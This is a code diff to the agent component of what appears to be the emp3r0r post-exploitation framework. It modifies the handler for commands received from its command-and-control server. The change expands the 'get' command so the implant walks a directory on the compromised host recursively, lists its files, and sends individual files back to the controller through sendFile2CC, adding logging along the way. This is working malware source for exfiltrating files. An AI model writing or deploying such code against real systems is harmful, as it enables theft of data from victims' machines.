@@ -6,6 +6,7 @@ import (
 	"log"
 	"os"
 	"os/exec"
+	"path/filepath"
 	"runtime"
 	"strconv"
 	"strings"
@@ -42,7 +43,7 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 
 	// parse command-line arguments using pflag
 	flags := pflag.NewFlagSet(cmdSlice[0], pflag.ContinueOnError)
-	flags.Parse(cmdSlice[1:])
+	log.Printf("Got command %s with args: %v", cmdSlice[0], cmdSlice)
 
 	// send response to CC
 	sendResponse := func(resp string) {
@@ -87,22 +88,51 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 		// Displays network information.
 		out = shellNet()
 	case "get":
-		// Usage: get --filepath <filepath> --offset <offset> --token <token>
+		// Usage: get --file_path <file_path> --offset <offset> --token <token>
 		// Downloads a file from the agent starting at the specified offset.
-		filepath := flags.StringP("filepath", "f", "", "File path to download")
+		log.Printf("get: %v", cmdSlice)
+		file_path := flags.StringP("file_path", "f", "", "File path to download")
 		offset := flags.Int64P("offset", "o", 0, "Offset to start downloading from")
 		token := flags.StringP("token", "t", "", "Token for the download")
 		flags.Parse(cmdSlice[1:])
-		if *filepath == "" || *offset < 0 || *token == "" {
+		log.Printf("Parsed: '%s' %d '%s'", *file_path, *offset, *token)
+		if *file_path == "" || *offset < 0 || *token == "" {
 			out = fmt.Sprintf("args error: %v", cmdSlice)
 			return
 		}
-		log.Printf("File download: %s at %d with token %s", *filepath, *offset, *token)
-		err = sendFile2CC(*filepath, *offset, *token)
-		out = fmt.Sprintf("%s has been sent, please check", *filepath)
+		log.Printf("File download: %s at %d with token %s", *file_path, *offset, *token)
+		if util.IsDirExist(*file_path) {
+			// directory, return a list of files to download
+			log.Printf("Downloading directory %s recursively", *file_path)
+			file_list := []string{}
+			err = filepath.Walk(*file_path, func(path string, info os.FileInfo, err error) error {
+				if err != nil {
+					return err
+				}
+				if !info.IsDir() {
+					file_list = append(file_list, path)
+					log.Printf("Found file '%s' to download", path)
+				}
+				return nil
+			})
+			if err != nil {
+				out = fmt.Sprintf("Error: failed to walk directory %s: %v", *file_path, err)
+				return
+			}
+			out = strings.Join(file_list, "\n")
+			return
+		} else {
+			// single file
+			err = sendFile2CC(*file_path, *offset, *token)
+			if err != nil {
+				out = fmt.Sprintf("Error: failed to send file %s: %v", *file_path, err)
+				return
+			}
+		}
+		out = fmt.Sprintf("Success: %s has been sent, please check", *file_path)
 		if err != nil {
 			log.Printf("get: %v", err)
-			out = *filepath + err.Error()
+			out = *file_path + err.Error()
 		}
 	case "screenshot":
 		// Usage: screenshot
